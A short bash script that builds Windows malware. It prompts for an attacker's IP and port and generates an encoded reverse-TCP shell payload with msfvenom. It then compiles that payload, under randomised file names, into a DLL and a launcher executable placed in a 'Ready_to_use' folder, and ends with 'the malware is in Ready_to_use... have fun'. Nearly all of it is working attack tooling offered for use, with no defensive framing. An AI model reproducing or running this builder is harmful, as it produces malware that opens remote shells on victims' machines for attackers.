#!/bin/bash

# sudo apt install mingw-w64

echo "
Attacker's ip :"
read ip
echo "
Attacker's port :"
read port

echo "
Generating a payload using msfvenom..."

msfvenom --platform windows -a x86 -p windows/shell/reverse_tcp LHOST=${ip} LPORT=${port} -f c -e x86/shikata_ga_nai -i 1 -b "\x00" > shellcode.txt

echo "
Payload done.
"

python3 setup_code.py

name1=$(echo $RANDOM | md5sum | head -c 10)
name2=$(echo $RANDOM | md5sum | head -c 10)

sed -i "s/<NAME_TO_REPLACE>/${name1}.dll/" tmp_launcher.c

mkdir Ready_to_use
rm Ready_to_use/*
x86_64-w64-mingw32-gcc tmp_dll.c -o Ready_to_use/${name1}.dll -shared
x86_64-w64-mingw32-gcc tmp_launcher.c -o Ready_to_use/${name2}.exe

echo "All done, the malware is in Ready_to_use/
Don't forget to put the dll in the given path, and have fun !"
